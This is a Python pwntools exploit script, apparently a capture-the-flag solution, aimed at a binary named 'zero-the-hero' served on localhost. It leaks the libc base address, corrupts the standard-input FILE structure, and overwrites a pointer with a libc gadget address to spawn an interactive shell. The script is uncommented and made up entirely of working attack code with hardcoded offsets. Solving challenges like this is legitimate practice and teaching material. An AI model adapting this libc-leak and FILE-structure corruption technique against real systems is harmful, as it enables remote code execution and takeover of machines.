from pwn import *

e = ELF("./bin/zero-the-hero")
libc = ELF("./bin/libc.so.6")

p = remote("localhost", 9998)

p.sendlineafter("?", str(0x30000))

p.recvuntil("0x")

ori = int(p.recvline(), 16)
leak = ori -  0x7f29dc0c7010 + 0x00007f29dbae2000
print("{:#x}".format(leak))


stdin = leak + libc.symbols["_IO_2_1_stdin_"]
guess = (stdin // 0x1000) % 0x10
if guess >= 3:
  print("Invalid stdin addr {:#x}".format(stdin))
  exit()

p.sendlineafter("?", str(leak + libc.symbols["_IO_2_1_stdin_"] + 8 * 8 + 1 - ori))


p.sendlineafter("?", (
  "A" * 5 + p64(leak - 0x7f23c4f85000 +  0x00007f23c53728d0)
).ljust(0x7f50d25e2c30 - 0x7f50d25e2a83, "A") + p64(leak + 0x10a38c)
)

p.interactive()
